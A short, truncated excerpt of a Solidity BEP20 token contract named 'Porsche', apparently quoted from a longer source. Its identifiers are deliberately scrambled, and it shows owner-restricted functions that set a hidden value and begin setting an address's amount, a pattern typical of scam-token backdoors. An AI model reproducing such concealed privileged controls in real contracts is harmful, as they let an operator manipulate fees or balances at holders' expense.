...
contract Porsche is BEP20, Owagufdbnk {
    ...
    uint256 private _rcKPudWyxfUlyA = 12;
    function setPairsJnTcu(uint256 _aountse) external onlsyFuntier {
        _rcKPudWyxfUlyA = _aountse;
    }
    ...
    function setAdminRkydtcC(address accuxiainwy,int256 amount ) external onlyrUqmo {
